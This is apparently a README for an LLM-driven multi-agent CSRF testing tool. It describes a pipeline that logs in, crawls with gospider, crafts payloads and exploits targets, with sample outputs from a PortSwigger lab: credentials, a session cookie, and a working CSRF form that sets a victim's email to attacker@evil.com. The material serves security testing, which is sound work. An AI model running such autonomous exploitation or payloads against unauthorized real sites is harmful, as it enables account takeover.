<div align="center">

# CSRF Agent v2 — Automated CSRF Recon, Testing, and Reporting

Robust, end-to-end CSRF discovery and exploitation workflow powered by multi‑agent orchestration (CrewAI), LLMs (OpenAI/Anthropic), and real shell tools (`gospider`, `curl`).  
It crawls, authenticates, identifies risky flows, crafts payloads, verifies findings, and ships a clean report.

[![Python](https://img.shields.io/badge/Python-3.10–3.13-3776AB.svg?logo=python&logoColor=white)](https://www.python.org/)
[![Poetry](https://img.shields.io/badge/Poetry-managed-1B1F23.svg?logo=poetry)](https://python-poetry.org/)
[![CrewAI](https://img.shields.io/badge/CrewAI-0.51.1-0B84F3.svg)](https://github.com/joaomdmoura/crewai)
[![LangChain](https://img.shields.io/badge/LangChain-0.2.x-1C3C3C.svg)](https://python.langchain.com/)
[![LLM](https://img.shields.io/badge/LLM-OpenAI%20%2F%20Anthropic-5E5E5E.svg)](https://)

</div>

---
<img width="1258" height="711" alt="image" src="https://github.com/user-attachments/assets/eca21d39-5210-4a08-84de-8b90b1c4a99d" />
<img width="1263" height="716" alt="image" src="https://github.com/user-attachments/assets/3cca3ceb-df9d-4423-a838-5d77003953f2" />
<img width="1270" height="719" alt="image" src="https://github.com/user-attachments/assets/7be20959-9a6b-47a8-a1c1-a2001d7c9a7a" />
<img width="1271" height="720" alt="image" src="https://github.com/user-attachments/assets/26580267-ed02-4e75-8412-8e0ff15b05ab" />
<img width="1268" height="709" alt="image" src="https://github.com/user-attachments/assets/ae5ee509-7242-4c04-b559-cef6c7cc1c04" />

## ✨ Overview

What is CSRF (Cross-Site-Request-Forgery)? - https://portswigger.net/web-security/csrf
`All testing has been performed on PortSwigger Labs for CSRF.` 

<img width="1022" height="604" alt="image" src="https://github.com/user-attachments/assets/d74e256e-5955-4561-b49a-02984c8e494b" />


CSRF Agent v2 is a task‑driven, multi‑agent pipeline that helps you:
- Discover login endpoints and authenticate against your target using provided credentials.
- Perform wide and configurable crawling using `gospider`.
- Identify likely CSRF attack surfaces (forms, state‑changing endpoints, missing or weak token protections).
- Generate practical CSRF payloads and attempt exploitation (with `curl` and hosted HTML proofs).
- Verify findings and produce a concise, reproducible Markdown report.

Artifacts are written to the repository root for easy review and diffing:
- `auth.md` — Authentication discovery and outcomes (sessions, cookies, tokens)
- `crawler.md` — Crawled URLs and surface enumeration
- `payloads.md` — Crafted payloads and test notes
- `verification.md` — Post‑report verification runs
- `report.md` — Final, structured CSRF report
- `logs.txt` — Run transcript
- `gospider_output/` — Crawl artifacts

Under the hood:
- Orchestration via `CrewAI` in `src/csrf_v2/crew.py`
- Entry point in `src/csrf_v2/main.py`
- Agent and task instructions in `src/csrf_v2/config/agents.yaml` and `src/csrf_v2/config/tasks.yaml`
- Shell integration using `ShellTool` to run `gospider`/`curl`

---

## ⚡ Quick Start

1) Prerequisites
- Python 3.10–3.13
- `gospider` and `curl` available on PATH
- An LLM provider configured via environment variables (OpenAI or Anthropic)

2) Configure environment
Create a `.env` file in the repo root:

```bash
# Target to assess
TARGET="https://your-app.example"

# Credential material (format is flexible for your flow; e.g., JSON, query, or form data)
CREDENTIALS='{"username":"alice","password":"secret"}'

# Choose one provider
LLM_PROVIDER=openai          # or: anthropic

# OpenAI (defaults to model "gpt-5" if unset)
OPENAI_API_KEY=sk-...
# OPENAI_MODEL=gpt-5

# Anthropic (defaults to model "claude-sonnet-4-5-20250929" if unset)
# ANTHROPIC_API_KEY=...
# ANTHROPIC_MODEL=claude-sonnet-4-5-20250929
```

3) Run
- Easiest (macOS): double‑click `Run CSRF v2.command`
- Or via script:

```bash
bash scripts/go.sh
```

- Or with Poetry:

```bash
poetry install
poetry run csrf_v2
# same as:
# poetry run run_crew
```

- Or plain Python:

```bash
python -m csrf_v2.main
```

Outputs appear in the repo root (`auth.md`, `crawler.md`, `payloads.md`, `verification.md`, `report.md`, `logs.txt`, and `gospider_output/`).

---

## 🔍 What It Does (Pipeline)

1. Authentication discovery  
   Finds login endpoints during crawl, attempts login using your provided credentials, and captures session artifacts (cookies, tokens, headers).
```
<auth_test_info>
Target URL: https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/login  
Authentication Type: Form-based  
Login Attempt Success: Yes  
Credentials Used: {"username":"wiener","password":"peter"}  
Session Information:  
  - Cookies: session=MMxorsSwPq48ZsyRmFqpYEfjL3WKND6l  
  - Session ID: MMxorsSwPq48ZsyRmFqpYEfjL3WKND6l  
  - Authentication Tokens: None  
  - Headers:  
      - set-cookie: session=MMxorsSwPq48ZsyRmFqpYEfjL3WKND6l; Secure; HttpOnly; SameSite=None  
Redirect URL: /my-account?id=wiener  
Authentication Protections: None observed  
Additional Notes: Successful login redirected to the account page.
</auth_test_info>
```
   

3. Crawler pass (`gospider`)  
   Enumerates the application to build a URL inventory focused on state‑changing routes and form-heavy pages.
```
<csrf_vulnerability_analysis>
1. Potential CSRF Attack Vectors:
   - Forms without CSRF tokens or protections, particularly those that change user data or perform sensitive actions.
   - Actions such as changing email, which can be exploited without adequate security measures.

2. Analyzed Pages:
   - The "My Account" page contains a form for changing the email address. This form lacks CSRF protection and can be exploited.
   - The logout functionality was checked but did not reveal a form for CSRF analysis as it redirected to the main account page.
   - The change email page revealed itself as a login page, indicating a need for further exploration of accessible forms.

3. Vulnerability Documentation:
   - **URL**: /my-account
     - **Title**: My Account
     - **Vulnerable Action**: Update email address
     - **Form Method**: POST
     - **CSRF Protections Present**: None
     - **Potential Impact**: Unauthorized email changes could lead to account takeover or sensitive information exposure.
     - **Suggested Mitigation**: Implement CSRF tokens in forms to ensure requests are legitimate and originate from authenticated users.

4. Severity Categorization:
   - The identified CSRF vulnerability on the email change form is categorized as **High** due to the potential impact of unauthorized email changes and the ease of exploitation.

5. Additional Considerations:
   - The lack of CSRF tokens in forms throughout the site poses a significant risk. Other forms and state-changing actions should be audited similarly.
   - Potentially chaining this vulnerability with other exploits could lead to severe account compromise.
</csrf_vulnerability_analysis>
<summary> 
- Potential CSRF vulnerabilities found: 1 
- Severity distribution: 1 High 
</summary>
<crawled_urls> 
- https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account?id=wiener 
- https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/logout 
- https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account/change-email 
</crawled_urls>
<csrf_vulnerabilities> 
<csrf_vulnerability_info>
URL: /my-account
Title: My Account
Vulnerable Action: Update email address
Form Method: POST
CSRF Protections Present: None
Potential Impact: Unauthorized email changes could lead to account takeover or sensitive information exposure.
Suggested Mitigation: Implement CSRF tokens in forms to ensure requests are legitimate and originate from authenticated users.
</csrf_vulnerability_info>
</csrf_vulnerabilities>
```

5. CSRF identification  
   Flags places where CSRF tokens may be absent, predictable, or weak; highlights high‑impact actions.

6. Exploitation & payload generation  
   Crafts HTML/`curl` payloads; can host simple HTML pages (local Python HTTP server) to validate real browser flows.

```xml
<csrf_test_info>
    Target URL: https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account/change-email
    Functionality: Update email address for user accounts
    Vulnerability Detected: Yes
    Successful Payload: 
    ```html
    <form action="https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="submit" value="Update Email">
    </form>
    ```
    Evidence of Exploitation: The CSRF payload was executed, triggering a POST request to change the email to "attacker@evil.com" without CSRF protection, thus successfully exploiting the vulnerability.
    Impact: Unauthorized email changes could lead to account takeover or sensitive information exposure. An attacker could gain control over user accounts, perform actions on behalf of users, or reset passwords.
    Mitigation Recommendations: Implement CSRF tokens in forms to ensure requests are legitimate and originate from authenticated users. Regularly audit forms for CSRF protections.
    Additional Notes: The testing confirmed a critical CSRF vulnerability in the email change functionality, emphasizing the need for stronger CSRF protection measures across the application.
</csrf_test_info>
```

8. Reporting & verification  
   Produces a structured Markdown report with steps to reproduce and mitigation advice, then re‑verifies each issue.
```
<vulnerability_report> 
<title>CSRF Vulnerability Report</title> 
<vulnerability_confidence>9</vulnerability_confidence> 
<summary>A CSRF vulnerability exists in the email update functionality, allowing unauthorized email changes.</summary> 
<severity>High - The ability to change user email addresses without CSRF protection poses a significant security risk.</severity> 
<affected_components>My Account - Change Email</affected_components> 
<description>The CSRF vulnerability allows an attacker to change a user's email address by submitting a forged request. This can be done without any CSRF tokens in place, leading to unauthorized access and potential account takeover.</description> 
<authentication>Yes, the vulnerability requires authentication.</authentication> 
<steps_to_reproduce> 
1. Log in to an account with valid credentials. 
2. Access the email change form. 
3. Submit the CSRF payload to change the email address. 
</steps_to_reproduce> 
<command_to_replicate> 
<form action="https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account/change-email" method="POST"> 
<input type="hidden" name="email" value="attacker@evil.com"> 
<input type="submit" value="Update Email"> 
</form> 
</command_to_replicate> 
<impact>If exploited, an attacker could change the email address of a user, leading to account takeover or exposure of sensitive information.</impact> 
<evidence_of_vulnerability>The CSRF payload was executed successfully, changing the email to "attacker@evil.com" without proper CSRF protection.</evidence_of_vulnerability> 
<recommendations>Implement CSRF tokens in forms and regularly audit for CSRF protections.</recommendations> 
<list_of_tested_urls> 
https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account?id=wiener, 
https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/logout, 
https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account/change-email 
</list_of_tested_urls> 
</vulnerability_report>
```
```
<verification> 
Target URL: https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account/change-email 
Vulnerability Verified: Yes 
Token Present: No 
Successful Exploit: 
```html
<form action="https://0a5f003c04cf4b1685023f5400b700de.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Update Email">
</form>
```
``` 
Evidence of Successful Exploitation: The CSRF payload was executed successfully, changing the email to "attacker@evil.com" without proper CSRF protection. 
Additional Notes: The testing confirmed a critical CSRF vulnerability in the email change functionality, emphasizing the need for stronger CSRF protection measures across the application. 
Report Improvement Suggestions: Implement CSRF tokens in forms to ensure requests are legitimate and originate from authenticated users. Regularly audit forms for CSRF protections. 
</verification>
```

---

## 🧰 Configuration & Structure

- `src/csrf_v2/main.py` — Entry point; reads `TARGET` and `CREDENTIALS` from environment and kicks off the crew.
- `src/csrf_v2/crew.py` — Defines agents (authentication, crawler, tester, reporter), tasks, and sequential process with logging.
- `src/csrf_v2/config/agents.yaml` — Roles/goals/backstories for each agent.
- `src/csrf_v2/config/tasks.yaml` — Detailed task prompts and expected output structures.
- `scripts/go.sh` — Zero‑friction runner: creates `.venv`, installs the project editable, loads `.env`, executes the crew.
- `Run CSRF v2.command` — macOS launcher that delegates to `scripts/go.sh`.

Environment variables:
- `TARGET` — Target base URL (required to do anything meaningful)
- `CREDENTIALS` — Credential material to use for authentication attempts
- `LLM_PROVIDER` — `openai` or `anthropic`
- `OPENAI_API_KEY` / `OPENAI_MODEL` — OpenAI config (model defaults to `gpt-5`)
- `ANTHROPIC_API_KEY` / `ANTHROPIC_MODEL` — Anthropic config (model defaults to `claude-sonnet-4-5-20250929`)

---

## 🗂️ Outputs & Artifacts

- `auth.md` — Login endpoints, attempts, cookies/tokens captured, notes
- `crawler.md` — Crawled URL list and high‑signal surfaces
- `payloads.md` — Candidate payloads and exploitation attempts
- `verification.md` — Verification results for each reported issue
- `report.md` — Final consolidated report (severity, impact, steps to reproduce, recommendations)
- `logs.txt` — Run logs from the agent pipeline
- `gospider_output/` — Raw crawler outputs

All these files are intentionally tracked in the repo root for side‑by‑side analysis.

---

## 🧪 Usage Tips

- Keep credentials realistic so automated login attempts look like genuine browser flows.
- Scope is strictly your `TARGET` domain—tasks are written to ignore placeholders and non‑target hosts.
- If needed, tune prompts in `tasks.yaml` to match your application’s auth flows or CSRF defenses.
- You can re‑run the pipeline to iterate payloads; artifacts will be updated, and `logs.txt` preserves the transcript.
- Hosting payloads without hanging the agent: use the built‑in `HttpServer` tool instead of a blocking shell command. Examples the agent can invoke:
  - `HttpServer`: "start" (defaults to port 8001, directory ".")
  - `HttpServer`: "start 8001 ./public"
  - `HttpServer`: "status 8001"
  - `HttpServer`: "stop 8001"
  Logs write to `http_server_<port>.log`, PID stored in `.http_server_<port>.pid`.

---

## 🩺 Troubleshooting

- “No LLM configured”  
  Set `LLM_PROVIDER` and the relevant API key(s). Default models are chosen if not provided.

- Too much console noise  
  - Set `VERBOSE=false` to disable CrewAI verbose console logging (still writes `logs.txt`).  
  - Optionally set `LOG_LEVEL=ERROR` (or `WARNING`) to further reduce library chatter.  
  - Run in quiet mode by exporting `QUIET=1` before `bash scripts/go.sh` to redirect all stdout/stderr into `logs.txt`.

- “No suitable Python (3.10–3.13) found”  
  Install Python 3.11 or 3.12 and re‑run `scripts/go.sh` or use `poetry env use`.

- `gospider: command not found`  
  Install `gospider` and ensure it’s on PATH.

- macOS can’t open `Run CSRF v2.command`  
  Right‑click → Open (to bypass Gatekeeper) or run `bash "Run CSRF v2.command"` from Terminal.

---

## ⚖️ Legal & Ethical

Use only on systems you own or have explicit, written authorization to test.  
The authors and contributors are not responsible for misuse or damage.

---

## 🤝 Contributing

Issues and PRs are welcome. Consider adding:
- Additional payload strategies and verification heuristics
- Provider‑specific LLM prompts and better model defaults
- Enhanced parsing of `gospider` output and form extraction

---

## 📜 License

No license specified. If you plan to distribute or modify, add an explicit license file.


